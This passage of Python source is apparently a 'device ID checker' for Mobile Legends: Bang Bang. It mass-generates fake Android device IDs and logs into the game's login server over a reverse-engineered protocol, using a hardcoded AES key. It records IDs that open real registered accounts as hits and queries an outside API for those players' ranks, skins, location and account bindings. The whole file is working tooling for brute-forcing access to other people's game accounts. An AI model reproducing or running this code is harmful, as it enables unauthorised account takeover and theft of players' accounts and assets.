import requests
import uuid
import time
import hashlib
import urllib3
import zlib
import zstandard as zstd
import socket
import logging
import random
import struct
import threading
import sys
import os
import shutil
import re
import signal
from datetime import datetime
from colorama import init, Fore, Style
from Crypto.Cipher import AES
from typing import Dict, List, Any, Union, Tuple, Optional
from rich.console import Console
from rich.text import Text
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from collections import deque
from threading import Lock, Event, Thread

init()

DEBUG_MODE = False
CHECK_OTHER_GAMES = False
_CLI_MODE = False            # set True when running with --file (CI / non-interactive)
_auto_remove_queue = []
_auto_remove_lock = threading.Lock()
_auto_remove_batch = 50

console = Console()
_shutil_ui = shutil

_CY  = Fore.CYAN + Style.BRIGHT
_GN  = Fore.GREEN + Style.BRIGHT
_RD  = Fore.RED + Style.BRIGHT
_YL  = Fore.YELLOW + Style.BRIGHT
_MG  = Fore.MAGENTA + Style.BRIGHT
_WH  = Fore.WHITE + Style.BRIGHT
_BLU = Fore.BLUE + Style.BRIGHT
_DIM = Style.DIM
_RST = Style.RESET_ALL
_BRT = Style.BRIGHT
_ITL = "\033[3m"
_SL  = "\033[38;5;240m"
_GR  = "\033[38;5;114m"
_GD  = "\033[38;5;222m"

output_lock = threading.Lock()

# ============================================================
# MAVS DEV CHECKER — RGB GRADIENT UI ENGINE
# ============================================================
W_   = '\x1b[0m'
BD_  = '\x1b[1m'
DIM_ = '\x1b[2m'

CYAN_C    = (0,   200, 220)
PURPLE_C  = (160,  80, 255)
GREEN_C   = (80,  220, 120)
MINT_C    = (100, 255, 200)
GOLD_C    = (255, 200,  60)
RED_C     = (255,  70,  70)
WHITE_C   = (230, 230, 240)
GRAY_C    = (100, 110, 130)
LAVENDER_C= (180, 140, 255)
TEAL_C    = (0,   180, 180)

A1, A2 = CYAN_C, PURPLE_C
H1, H2 = GREEN_C, MINT_C
V1, V2 = CYAN_C, LAVENDER_C

def rgb(r, g, b): return f'\x1b[38;2;{r};{g};{b}m'
def lerp(a, b, t): return int(a + (b - a) * t)
def c_rgb(color): return rgb(*color)

def gradient_text(text, c1, c2):
    if not text: return ''
    out = ''
    for i, ch in enumerate(text):
        t = i / max(len(text) - 1, 1)
        out += f'{rgb(lerp(c1[0],c2[0],t), lerp(c1[1],c2[1],t), lerp(c1[2],c2[2],t))}{ch}'
    return out + W_

def _vlen(s):
    return len(re.sub(r'\x1b\[[^m]*m', '', str(s)))

def _tw2(): return shutil.get_terminal_size((80, 24)).columns
def _BW():  return min(_tw2() - 4, 58)

def p(text, end='\n'):
    try:   print(text, end=end, flush=True)
    except UnicodeEncodeError:
        print(text.encode('ascii','ignore').decode('ascii'), end=end, flush=True)

def gtop(c1=A1, c2=A2):
    return gradient_text('╭' + '─' * (_BW() - 2) + '╮', c1, c2)
def gbot(c1=A1, c2=A2):
    return gradient_text('╰' + '─' * (_BW() - 2) + '╯', c1, c2)
def gmid(c1=A1, c2=A2):
    return gradient_text('├' + '─' * (_BW() - 2) + '┤', c1, c2)
def gdash(c1=A1, c2=A2):
    return gradient_text('├' + '╌' * (_BW() - 2) + '┤', c1, c2)
def gsep(c1=A1, c2=A2):
    return gradient_text('─' * _BW(), c1, c2)

def grow(text, c1=A1, c2=A2):
    pad = max(_BW() - 4 - _vlen(text), 0)
    return f'{c_rgb(c1)}│{W_} {text}{" " * pad} {c_rgb(c2)}│{W_}'

def gtitle(text, c1=A1, c2=A2):
    total = _BW() - 4 - _vlen(text)
    lp = total // 2; rp = total - lp
    return f'{c_rgb(c1)}│{W_}{" " * (lp+1)}{text}{" " * (rp+1)}{c_rgb(c2)}│{W_}'

def grad_bar(current, total, width=22):
    if total == 0: return f"{c_rgb(GRAY_C)}{'░' * width}{W_}"
    filled = int(width * current / total)
    bar = ''
    for i in range(filled):
        t = i / max(width - 1, 1)
        bar += f'{rgb(lerp(CYAN_C[0],PURPLE_C[0],t), lerp(CYAN_C[1],PURPLE_C[1],t), lerp(CYAN_C[2],PURPLE_C[2],t))}█'
    bar += f"{c_rgb(GRAY_C)}{'░' * (width - filled)}{W_}"
    return f'{bar} {c_rgb(WHITE_C)}{current/total*100:.0f}%{W_}'

def _elapsed_str(start):
    e = time.time() - start
    h = int(e // 3600); m = int(e % 3600 // 60); s = int(e % 60)
    return f'{h:02d}:{m:02d}:{s:02d}' if h > 0 else f'{m:02d}:{s:02d}'

def _log(level: str, msg: str, indent: str = '  '):
    if not DEBUG_MODE:
        return
    clean = _strip_rich(msg)
    print(f'{indent}{clean}')

def _strip_rich(text):
    return re.sub(r'\[/?[^\]]+\]', '', str(text))

def _visible_len(text):
    return len(re.sub(r'\x1b\[[0-9;]*m', '', str(text)))

def _tw():
    return _shutil_ui.get_terminal_size((80, 24)).columns

def _w(n=72):
    return min(_tw() - 4, n)

def _ts():
    return datetime.now().strftime('%H:%M:%S')

def _sigint_handler(sig, frame):
    print(f'\n  {_YL}⚠  Ctrl+C – exiting…{_RST}')
    os._exit(0)

signal.signal(signal.SIGINT, _sigint_handler)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================
# RESULT RENDERER  (gradient RGB style)
# ============================================================

def _truncate_did(did: str) -> str:
    """Shorten dev-id to fit narrow terminals."""
    max_len = max(_BW() - 22, 20)
    if len(did) <= max_len:
        return did
    return did[:max_len // 2] + '…' + did[-(max_len // 2):]

def print_result(result_type: str, device_id: str, level=None, skin=None):
    """Thread-safe result printer. result_type: 'HIT' | 'INVALID' | 'ERROR'"""
    # In CLI mode, skip INVALID to avoid flooding the log with 100k lines
    if _CLI_MODE and result_type == 'INVALID':
        return

    with output_lock:
        did = _truncate_did(str(device_id))

        if _CLI_MODE:
            # Plain line output for CI logs
            if result_type == 'HIT':
                lv = str(level) if level is not None else '—'
                sk = str(skin)  if skin  is not None else '—'
                print(f'HIT  {device_id}  LEVEL:{lv}  SKIN:{sk}', flush=True)
            elif result_type == 'ERROR':
                print(f'ERROR  {device_id}', flush=True)
            return

        if result_type == 'HIT':
            lv = str(level) if level is not None else '—'
            sk = str(skin)  if skin  is not None else '—'
            p(f"\r{' ' * 100}\r", end='')          # clear any inline status
            p(f'  {c_rgb(GREEN_C)}{BD_}✓ HIT{W_}  '
              f'{c_rgb(WHITE_C)}{did}{W_}')
            p(f'     {c_rgb(GRAY_C)}LEVEL {W_}'
              f'{c_rgb(GOLD_C)}{BD_}{lv}{W_}  '
              f'{c_rgb(GRAY_C)}•  SKIN {W_}'
              f'{c_rgb(GOLD_C)}{BD_}{sk}{W_}')
            p('')

        elif result_type == 'INVALID':
            p(f"\r{' ' * 100}\r", end='')
            p(f'  {c_rgb(RED_C)}{BD_}✗ INVALID{W_}  '
              f'{c_rgb(GRAY_C)}{did}{W_}')

        elif result_type == 'ERROR':
            p(f"\r{' ' * 100}\r", end='')
            p(f'  {c_rgb(GOLD_C)}⚠  ERROR{W_}  '
              f'{c_rgb(GRAY_C)}{did}{W_}')

_status_tick = [0]

def print_status_line(checked, total, hits, invalid, errors, start_time):
    """Inline progress line — overwrites itself, no newline."""
    if _CLI_MODE:
        # Only log every 1000 checks (plus the very last one)
        _status_tick[0] += 1
        if _status_tick[0] % 1000 != 0 and checked < total:
            return
        elapsed = time.time() - start_time
        speed   = checked / max(elapsed, 0.001)
        print(f'PROGRESS  {checked}/{total}  '
              f'H:{hits}  I:{invalid}  E:{errors}  '
              f'({speed:.1f}/s)  {_elapsed_str(start_time)}', flush=True)
        return

    elapsed = time.time() - start_time
    speed   = checked / max(elapsed, 0.001)
    bar     = grad_bar(checked, total)
    e_str   = _elapsed_str(start_time)
    line = (
        f' {bar}  '
        f'{c_rgb(CYAN_C)}CHK:{checked}/{total}{W_}  '
        f'{c_rgb(GREEN_C)}H:{hits}{W_}  '
        f'{c_rgb(RED_C)}I:{invalid}{W_}  '
        f'{c_rgb(GOLD_C)}E:{errors}{W_}  '
        f'{c_rgb(LAVENDER_C)}{speed:.1f}/s{W_}  '
        f'{c_rgb(GRAY_C)}{e_str}{W_} '
    )
    p(f'\r{line}', end='')

def print_summary(total: int, hits: int, invalid: int, errors: int, elapsed: float):
    h  = int(elapsed // 3600)
    m  = int((elapsed % 3600) // 60)
    s  = int(elapsed % 60)
    t_str  = f'{h:02d}:{m:02d}:{s:02d}' if h else f'{m:02d}:{s:02d}'
    speed  = total / max(elapsed, 0.001)

    if _CLI_MODE:
        print('', flush=True)
        print('=' * 60, flush=True)
        print('CHECK COMPLETE', flush=True)
        print('=' * 60, flush=True)
        print(f'HIT       : {hits:,}', flush=True)
        print(f'INVALID   : {invalid:,}', flush=True)
        print(f'ERROR     : {errors:,}', flush=True)
        print(f'TOTAL     : {total:,}', flush=True)
        print(f'SPEED     : {speed:.1f}/s', flush=True)
        print(f'TIME      : {t_str}', flush=True)
        print('=' * 60, flush=True)
        return

    p(f"\r{' ' * 120}\r", end='')
    p('')
    p(f' {gtop(V1, V2)}')
    p(f' {gtitle(f"{c_rgb(WHITE_C)}{BD_}CHECK COMPLETE{W_}", V1, V2)}')
    p(f' {gmid(V1, V2)}')
    p(f' {grow("", V1, V2)}')
    p(f' {grow(f"{c_rgb(GREEN_C)}{BD_}HIT{W_}         : {c_rgb(WHITE_C)}{hits:,}{W_}", V1, V2)}')
    p(f' {grow(f"{c_rgb(RED_C)}INVALID{W_}     : {c_rgb(WHITE_C)}{invalid:,}{W_}", V1, V2)}')
    p(f' {grow(f"{c_rgb(GOLD_C)}ERROR{W_}       : {c_rgb(WHITE_C)}{errors:,}{W_}", V1, V2)}')
    p(f' {gdash(V1, V2)}')
    p(f' {grow(f"{c_rgb(CYAN_C)}TOTAL{W_}       : {c_rgb(WHITE_C)}{total:,}{W_}", V1, V2)}')
    p(f' {grow(f"{c_rgb(LAVENDER_C)}SPEED{W_}       : {c_rgb(WHITE_C)}{speed:.1f}/s{W_}", V1, V2)}')
    p(f' {grow(f"{c_rgb(GRAY_C)}TIME{W_}        : {c_rgb(WHITE_C)}{t_str}{W_}", V1, V2)}')
    p(f' {grow("", V1, V2)}')
    p(f' {gbot(V1, V2)}')
    p('')

# ============================================================
# DEVICE ID GENERATOR
# ============================================================

class MLBBDeviceIDGenerator:
    def __init__(self):
        self.prefix = "and"
        self.separator = "_"

    def generate_md5(self, seed: Optional[str] = None) -> str:
        if seed is None:
            seed = str(uuid.uuid4()) + str(random.random()) + str(datetime.now().timestamp())
        return hashlib.md5(seed.encode()).hexdigest()

    def generate_android_id(self) -> str:
        return ''.join(random.choices('0123456789abcdef', k=16))

    def generate_advertising_id(self) -> str:
        return str(uuid.uuid4())

    def generate_combo(self, include_advertising: bool = True) -> Tuple[str, str]:
        imei_seed = str(uuid.uuid4()) + str(random.randint(1000000000, 9999999999))
        android_id = self.generate_android_id()
        advertising_id = self.generate_advertising_id() if include_advertising else ""
        imei_md5 = self.generate_md5(imei_seed)
        device_id = f"{self.prefix}_{imei_md5}{android_id}{advertising_id}"
        return device_id, imei_md5

    def generate_batch(self, count: int = 100, include_advertising: bool = True) -> list:
        results = []
        for _ in range(count):
            device_id, _ = self.generate_combo(include_advertising)
            results.append(device_id)
        return results

    def generate_smart(self, count: int = 1) -> list:
        results = []
        for _ in range(count):
            android_id = self.generate_android_id()
            adv_types = [
                lambda: str(uuid.uuid4()),
                lambda: f"{uuid.uuid4().hex[:8]}-{uuid.uuid4().hex[:4]}-{uuid.uuid4().hex[:4]}-{uuid.uuid4().hex[:4]}-{uuid.uuid4().hex[:12]}",
                lambda: self._generate_android_advertising_id()
            ]
            advertising_id = random.choice(adv_types)()
            imei_seed = f"{android_id}{advertising_id}{random.randint(100000000, 999999999)}{uuid.uuid4()}"
            imei_md5 = self.generate_md5(imei_seed)
            device_id = f"{self.prefix}_{imei_md5}{android_id}{advertising_id}"
            results.append(device_id)
        return results

    def _generate_android_advertising_id(self) -> str:
        return '-'.join([
            ''.join(random.choices('0123456789abcdef', k=8)),
            ''.join(random.choices('0123456789abcdef', k=4)),
            ''.join(random.choices('0123456789abcdef', k=4)),
            ''.join(random.choices('0123456789abcdef', k=4)),
            ''.join(random.choices('0123456789abcdef', k=12))
        ])

    def validate_device_id(self, device_id: str) -> bool:
        try:
            if not device_id.startswith("and_"):
                return False
            parts = device_id.split("_")
            if len(parts) != 2:
                return False
            data = parts[1]
            if len(data) < 48:
                return False
            imei_md5 = data[:32]
            if not all(c in '0123456789abcdef' for c in imei_md5):
                return False
            android_id = data[32:48]
            if len(android_id) == 16:
                if not all(c in '0123456789abcdef' for c in android_id):
                    return False
            return True
        except Exception:
            return False

# ============================================================
# SDP PROTOCOL
# ============================================================

class SdpDataType:
    INTEGER_POSITIVE = 0
    INTEGER_NEGATIVE = 1
    FLOAT = 2
    DOUBLE = 3
    STRING = 4
    LIST = 5
    DICT = 6
    STRUCT_BEGIN = 7
    STRUCT_END = 8

class SdpException(Exception):
    def __init__(self, message):
        self.message = message
        super().__init__(self.message)

class SdpStruct(dict):
    def __init__(self, data=None):
        super().__init__()
        self.data = b''
        self.offset = 0
        if isinstance(data, bytes):
            self.data = data
            self.offset = 0
            self._unpack_from_binary()
        elif data is not None:
            super().update(data)
            self._pack_to_binary()

    def _pack_to_binary(self):
        self.data = bytes([SdpDataType.STRUCT_BEGIN << 4])
        for tag, value in sorted(self.items()):
            self._pack(tag, value)
        self.data += bytes([SdpDataType.STRUCT_END << 4])

    def _unpack_from_binary(self):
        if not self.data:
            return
        if self.data[0] >> 4 == SdpDataType.STRUCT_BEGIN:
            self.offset = 1
        while self.offset < len(self.data):
            tag, value = self._unpack()
            if value == SdpDataType.STRUCT_END:
                break
            self[tag] = value

    def _write_number(self, value: int) -> bytes:
        result = bytearray()
        while value >= 0x80:
            result.append((value & 0x7F) | 0x80)
            value >>= 7
        result.append(value & 0x7F)
        return bytes(result)

    def _read_number(self) -> int:
        n = 1
        val = self.data[self.offset] & 0x7F
        while self.data[self.offset + n - 1] >= 0x80:
            val |= (self.data[self.offset + n] & 0x7F) << (7 * n)
            n += 1
        self.offset += n
        return val

    def _pack_header(self, tag: int, data_type: int) -> None:
        if tag < 15:
            self.data += bytes([(data_type << 4) | tag])
        else:
            self.data += bytes([(data_type << 4) | 15])
            self.data += self._write_number(tag)

    def _pack(self, tag: int, value: Any) -> None:
        if isinstance(value, bool):
            self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
            self.data += self._write_number(1 if value else 0)
        elif isinstance(value, int):
            if value < 0:
                self._pack_header(tag, SdpDataType.INTEGER_NEGATIVE)
                self.data += self._write_number(-value)
            else:
                self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
                self.data += self._write_number(value)
        elif isinstance(value, float):
            self._pack_header(tag, SdpDataType.DOUBLE)
            packed = struct.pack("<d", value)
            self.data += self._write_number(len(packed))
            self.data += packed
        elif isinstance(value, str) or isinstance(value, bytes):
            self._pack_header(tag, SdpDataType.STRING)
            encoded = value.encode('utf-8') if isinstance(value, str) else value
            self.data += self._write_number(len(encoded))
            self.data += encoded
        elif isinstance(value, list):
            self._pack_header(tag, SdpDataType.LIST)
            self.data += self._write_number(len(value))
            for item in value:
                self._pack(0, item)
        elif isinstance(value, dict):
            if isinstance(value, SdpStruct):
                self._pack_header(tag, SdpDataType.STRUCT_BEGIN)
                for k, v in sorted(value.items()):
                    self._pack(k, v)
                self.data += bytes([SdpDataType.STRUCT_END << 4])
            else:
                self._pack_header(tag, SdpDataType.DICT)
                self.data += self._write_number(len(value))
                for k, v in sorted(value.items()):
                    self._pack(0, k)
                    self._pack(0, v)
        else:
            raise SdpException(f"Unsupported type: {type(value)}")

    def _unpack(self) -> Tuple[int, Any]:
        try:
            if self.offset >= len(self.data):
                return 0, None
            header = self.data[self.offset]
            tag = header & 0xF
            data_type = header >> 4
            self.offset += 1
            if tag == 15:
                tag = self._read_number()
            if data_type == SdpDataType.INTEGER_POSITIVE:
                return tag, self._read_number()
            elif data_type == SdpDataType.INTEGER_NEGATIVE:
                return tag, -self._read_number()
            elif data_type == SdpDataType.FLOAT:
                value = self._read_number().to_bytes(4, 'little')
                return tag, struct.unpack("<f", value)[0]
            elif data_type == SdpDataType.DOUBLE:
                value = self._read_number().to_bytes(8, 'little')
                return tag, struct.unpack("<d", value)[0]
            elif data_type == SdpDataType.STRING:
                length = self._read_number()
                try:
                    value = self.data[self.offset:self.offset + length].decode('utf-8')
                except UnicodeDecodeError:
                    value = self.data[self.offset:self.offset + length]
                self.offset += length
                return tag, value
            elif data_type == SdpDataType.LIST:
                length = self._read_number()
                value = []
                for _ in range(length):
                    _, item = self._unpack()
                    value.append(item)
                return tag, value
            elif data_type == SdpDataType.DICT:
                length = self._read_number()
                value = {}
                for _ in range(length):
                    _, k = self._unpack()
                    _, v = self._unpack()
                    value[k] = v
                return tag, value
            elif data_type == SdpDataType.STRUCT_BEGIN:
                struct_data = {}
                while True:
                    sub_tag, sub_value = self._unpack()
                    if sub_value == SdpDataType.STRUCT_END:
                        break
                    struct_data[sub_tag] = sub_value
                return tag, SdpStruct(struct_data)
            elif data_type == SdpDataType.STRUCT_END:
                return tag, SdpDataType.STRUCT_END
            else:
                raise SdpException(f"Unknown data type: {data_type}")
        except Exception as e:
            raise SdpException(f"Error unpacking data: {e}")

    def __repr__(self):
        return f"SdpStruct({dict(self)})"

    def copy(self):
        return SdpStruct(super().copy())

    def update(self, other):
        if isinstance(other, SdpStruct):
            super().update(other)
        else:
            super().update(other)
        self._pack_to_binary()

AES_KEY = bytes.fromhex('f5a193d50ade553e9835595f5cd75ddd')
AES_IV = b'\x00' * 16

# ============================================================
# GAME CONNECTION
# ============================================================

class BaseConnection:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sequence = 1
        self.socket = None
        self.queue_data = b''
        self.last_header_size = 0

    def __enter__(self):
        self.connect()
        return self

    def __exit__(self, exc_type, exc, tb):
        self.cleanup()

    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.host, self.port))
        self.socket.settimeout(5)

    def cleanup(self):
        if self.socket:
            self.socket.close()
            self.sequence = 1
            self.socket = None

    def send_data(self, packet_id, sdp):
        packet = SdpStruct({
            0: packet_id,
            1: self.sequence,
            5: sdp.data
        }).data
        buf = zstd.compress(packet)
        flags = (len(buf) + 4) | (16 << 24)
        buf = flags.to_bytes(4, 'big') + buf
        dbg(f"SEND  packet_id={packet_id}  seq={self.sequence}")
        self.socket.send(buf)
        self.sequence += 1

    def recv_data(self):
        try:
            while len(self.queue_data) < 4:
                data = self.socket.recv(4096)
                if not data:
                    return None, None
                self.queue_data += data

            flags = int.from_bytes(self.queue_data[:4], 'big')
            size = flags & 0xFFFFFF
            compression_type = flags >> 24
            self.last_header_size = size

            while len(self.queue_data) < size:
                data = self.socket.recv(4096)
                if not data:
                    return None, None
                self.queue_data += data

            data = self.queue_data[4:size]
            self.queue_data = self.queue_data[size:]

            if compression_type == 16:
                data = zstd.decompress(data)
            elif compression_type == 2:
                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                data = cipher.decrypt(data).rstrip(b'\x00')
            elif compression_type == 3:
                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                data = zlib.decompress(cipher.decrypt(data).rstrip(b'\x00'))
            elif compression_type == 18:
                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                data = zstd.decompress(cipher.decrypt(data).rstrip(b'\x00'))
            elif compression_type == 1:
                data = zlib.decompress(data)

            result = SdpStruct(data)
            packet_id = result[0]
            if packet_id is None:
                return None, None

            res = result.get(6, result.get(5, None))
            if not res or not isinstance(res, bytes):
                return packet_id, None

            return packet_id, SdpStruct(res)

        except socket.timeout:
            return -1, None
        except Exception as e:
            dbg(f"RECV error: {e}")
            return None, None

def dbg(label, data=None, color=Fore.MAGENTA):
    if not DEBUG_MODE:
        return
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    if data is None:
        print(f"{color}[DBG {ts}] {label}{Style.RESET_ALL}")
    else:
        print(f"{color}[DBG {ts}] {label}{Style.RESET_ALL}")
        if isinstance(data, (bytes, bytearray)):
            hex_str = data.hex()
            for i in range(0, len(hex_str), 64):
                print(f"  {Fore.CYAN}{hex_str[i:i+64]}{Style.RESET_ALL}")
        elif isinstance(data, dict):
            for k, v in data.items():
                print(f"  {Fore.CYAN}[{k}] => {repr(v)[:120]}{Style.RESET_ALL}")
        else:
            print(f"  {Fore.CYAN}{repr(data)[:200]}{Style.RESET_ALL}")

class GameConnection(BaseConnection):
    def __init__(self, device_id, device_model=None):
        super().__init__('login.ml.youngjoygame.com', 30021)
        self.device_id = device_id
        self.device_model = device_model or "Xiaomi:Redmi Note 12"

        parts = self.device_id.split('_')
        if len(parts) >= 2:
            device_info = parts[1]
            if len(device_info) >= 32:
                self.imei_md5 = device_info[:32]
                self.android_id = device_info[32:48] if len(device_info) >= 48 else ""
                self.advertising_id = device_info[48:] if len(device_info) > 48 else ""
            else:
                self.imei_md5 = device_info
                self.android_id = ""
                self.advertising_id = ""
        else:
            self.imei_md5 = device_id
            self.android_id = ""
            self.advertising_id = ""

        self.channel = 'and_usa'
        self.client_version = '2.1.61.1173.1'
        self.account_id = 0
        self.session_key = ''
        self.zone_id = 0
        self.game_server_host = ''
        self.game_server_port = 0
        self.creation_ts = 0
        self.is_registered = False
        self.login_success = False

    def login_with_device(self):
        if self.host != 'login.ml.youngjoygame.com' or self.port != 30021:
            self.cleanup()
            self.host = 'login.ml.youngjoygame.com'
            self.port = 30021
            self.connect()

        self.send_data(1, SdpStruct({
            0: self.device_id,
            1: f'gps_adid={self.advertising_id}&android_id={self.android_id}&device_unique_id={self.imei_md5}',
            2: self.client_version,
            3: self.channel,
            4: 'en'
        }))

        id, res = self.recv_data()

        if id == 2 and res:
            self.account_id = res.get(0)
            self.session_key = res.get(1)
            self.zone_id = res.get(2, [0])[0] if res.get(2) else 0
            self.creation_ts = res.get(19, 0)

            account_id_str = str(self.account_id)
            if account_id_str.startswith('221') or account_id_str.startswith('222'):
                self.is_registered = False
                self.login_success = False
                return False
            else:
                self.is_registered = True
                self.login_success = True
                return True
        else:
            self.login_success = False
            return False

    def get_game_server(self):
        self.send_data(5, SdpStruct({
            0: self.account_id,
            1: self.session_key,
            2: self.client_version,
            5: self.zone_id,
            6: self.channel
        }))

        id, res = self.recv_data()
        if id == 6 and res:
            game_server = res[1]
            self.game_server_host, self.game_server_port = game_server.split(':')
            self.game_server_port = int(self.game_server_port)
            return True
        return False

    def connect_to_game_server(self):
        self.cleanup()
        self.host = self.game_server_host
        self.port = self.game_server_port
        self.connect()

        self.send_data(10001, SdpStruct({
            0: self.account_id,
            1: self.session_key,
            2: self.zone_id,
            4: self.client_version,
            13: self.channel,
            15: self.device_id
        }))

        self.send_data(10101, SdpStruct({0: 0, 2: 2}))

        for _ in range(30):
            id, res = self.recv_data()
            if id == 10002:
                return True
            elif id == 20001:
                continue
            elif id == -1:
                return False
            elif id is None:
                return False

        return False

    def __enter__(self):
        super().__enter__()
        login_success = self.login_with_device()
        if not login_success:
            return self

        if not self.get_game_server():
            raise ConnectionError("SERVER_SELECTION_FAILED")
        if not self.connect_to_game_server():
            raise ConnectionError("GAME_SERVER_FAILED")
        return self

# ============================================================
# LOOKUP CLIENT  (inlined — no external api_client.py required)
# ============================================================

LOOKUP_API_URL   = "https://mlbbbbv2.onrender.com/lookup"
LOOKUP_TIMEOUT   = 60      # seconds
LOOKUP_RETRIES   = 3
LOOKUP_BACKOFF   = 1.0     # base seconds
LOOKUP_BACKOFF_MAX = 60.0


class _LookupRateLimitError(Exception):
    def __init__(self, retry_after: int = 5):
        self.retry_after = retry_after
        super().__init__(f"rate_limited (retry after {retry_after}s)")


def _lookup_jitter(attempt: int) -> float:
    return min(LOOKUP_BACKOFF * (2 ** attempt) + 0.5 * random.random(), LOOKUP_BACKOFF_MAX)


def _lookup_player(account_id, zone_id) -> Dict[str, Any]:
    """
    POST https://mlbbbbv2.onrender.com/lookup
    Body: {"role_id": str(account_id), "zone_id": str(zone_id)}

    Returns {"status": "success", "player_data": {...}}
         or {"status": "error",   "error": "..."}
    """
    payload = {"role_id": str(account_id), "zone_id": str(zone_id)}

    for attempt in range(LOOKUP_RETRIES + 1):
        try:
            resp = requests.post(
                LOOKUP_API_URL,
                json=payload,
                timeout=LOOKUP_TIMEOUT,
            )

            if resp.status_code == 429:
                retry_after = 5
                try:
                    retry_after = int(resp.headers.get("Retry-After", 5))
                except (ValueError, TypeError):
                    pass
                try:
                    body = resp.json()
                    if body.get("retry_after"):
                        retry_after = int(body["retry_after"])
                except Exception:
                    pass
                if attempt < LOOKUP_RETRIES:
                    time.sleep(_lookup_jitter(attempt))
                    continue
                return {"status": "error", "error": f"rate_limited_retry_after_{retry_after}s"}

            if resp.status_code >= 500 and attempt < LOOKUP_RETRIES:
                time.sleep(_lookup_jitter(attempt))
                continue

            if resp.status_code == 400:
                return {"status": "error", "error": "bad_request"}
            if resp.status_code == 404:
                return {"status": "error", "error": "not_found"}
            if resp.status_code >= 400:
                return {"status": "error", "error": f"http_{resp.status_code}"}

            try:
                data = resp.json()
            except ValueError:
                return {"status": "error", "error": "invalid_json_response"}

            if data.get("status") == "success":
                player_data = data.get("player_data")
                if not isinstance(player_data, dict):
                    return {"status": "error", "error": "missing_player_data"}
                return {"status": "success", "player_data": player_data}

            return {"status": "error", "error": data.get("error", "upstream_error")}

        except requests.exceptions.Timeout:
            if attempt < LOOKUP_RETRIES:
                time.sleep(_lookup_jitter(attempt))
                continue
            return {"status": "error", "error": "timeout"}

        except requests.exceptions.ConnectionError:
            if attempt < LOOKUP_RETRIES:
                time.sleep(_lookup_jitter(attempt))
                continue
            return {"status": "error", "error": "connection_error"}

        except Exception as exc:
            return {"status": "error", "error": f"unexpected: {str(exc)[:120]}"}

    return {"status": "error", "error": "max_retries_exceeded"}


class FullInfoLookup:
    """
    Normalises raw player_data returned by _lookup_player().
    Fully self-contained — no external api_client module needed.
    """

    def lookup(self, role_id: Union[int, str], zone_id: Union[int, str]) -> Dict[str, Any]:
        raw = _lookup_player(role_id, zone_id)

        if raw.get("status") == "success":
            player_data = raw.get("player_data", {})
            return {
                "status": "success",
                "player_data": self._normalize_player_data(player_data),
            }
        return {
            "status": "error",
            "error": raw.get("error", "unknown_lookup_error"),
        }

    def _normalize_player_data(self, data: Dict[str, Any]) -> Dict[str, Any]:
        def safe_int(value, default=0):
            try:
                if value is None:
                    return default
                return int(value)
            except (ValueError, TypeError):
                return default

        def safe_str(value, default="—"):
            if value is None:
                return default
            try:
                s = str(value).strip()
                return s if s else default
            except Exception:
                return default

        skin_breakdown = data.get("skin_breakdown", {})
        if not isinstance(skin_breakdown, dict):
            skin_breakdown = {}

        return {
            "player_id": safe_str(data.get("player_id")),
            "nickname": safe_str(data.get("nickname")),
            "level": safe_int(data.get("level")),
            "hero_count": safe_int(data.get("hero_count")),
            "skin_count": safe_int(data.get("skin_count")),
            "skin_breakdown": {
                "Supreme": safe_int(skin_breakdown.get("Supreme")),
                "Grand": safe_int(skin_breakdown.get("Grand")),
                "Exquisite": safe_int(skin_breakdown.get("Exquisite")),
                "Deluxe": safe_int(skin_breakdown.get("Deluxe")),
                "Exceptional": safe_int(skin_breakdown.get("Exceptional")),
                "Common": safe_int(skin_breakdown.get("Common")),
            },
            "current_rank": safe_str(data.get("current_rank")),
            "high_rank": safe_str(data.get("high_rank")),
            "location": safe_str(data.get("location"), "NOT FOUND"),
            "last_login": safe_str(data.get("last_login")),
            "achievement_points": safe_int(data.get("achievement_points")),
            "collector_point": safe_int(data.get("collector_point")),
            "collector_tier": safe_str(data.get("collector_tier")),
            "squad": safe_str(data.get("squad")),
            "bindings": safe_str(data.get("bindings")),
            "win_rate": safe_int(data.get("win_rate"), 0),
            "matches": safe_int(data.get("matches")),
            "mvp": safe_int(data.get("mvp")),
            "top_heroes": data.get("top_heroes", []),
            "hero_history": data.get("hero_history", []),
        }

# ============================================================
# VALID DEVICES COLLECTOR
# ============================================================

valid_devices_list = []
valid_devices_lock = threading.Lock()

def add_valid_device(device_id, account_id, zone_id, player_data=None):
    with valid_devices_lock:
        entry = {
            'device_id': str(device_id),
            'account_id': str(account_id),
            'zone_id': str(zone_id)
        }
        if player_data:
            entry['player_data'] = player_data
        valid_devices_list.append(entry)

def get_valid_devices():
    with valid_devices_lock:
        return valid_devices_list.copy()

# ============================================================
# LIVE STATS
# ============================================================

class LiveStats:
    def __init__(self):
        self.registered_count = 0
        self.unregistered_count = 0
        self.error_count = 0
        self.lookup_success = 0
        self.lookup_errors = 0
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.total_accounts = 0
        self.last_result_queue = deque(maxlen=200)
        self.total_level = 0
        self.total_skins = 0
        self.level_count = 0
        self.skin_count_records = 0
        self.max_level = 0
        self.max_skins = 0

    def update_stats(self, is_registered=False, is_error=False, lookup_success=False, lookup_error=False):
        with self.lock:
            if is_error:
                self.error_count += 1
            elif is_registered:
                self.registered_count += 1
            else:
                self.unregistered_count += 1
            if lookup_success:
                self.lookup_success += 1
            if lookup_error:
                self.lookup_errors += 1

    def update_full_info(self, level=None, skin_count=None):
        with self.lock:
            if level is not None:
                try:
                    lv = int(level)
                    self.total_level += lv
                    self.level_count += 1
                    if lv > self.max_level:
                        self.max_level = lv
                except (ValueError, TypeError):
                    pass
            if skin_count is not None:
                try:
                    sk = int(skin_count)
                    self.total_skins += sk
                    self.skin_count_records += 1
                    if sk > self.max_skins:
                        self.max_skins = sk
                except (ValueError, TypeError):
                    pass

    def get_stats(self):
        with self.lock:
            return {
                'registered': self.registered_count,
                'unregistered': self.unregistered_count,
                'error': self.error_count,
                'lookup_success': self.lookup_success,
                'lookup_errors': self.lookup_errors,
                'total_level': self.total_level,
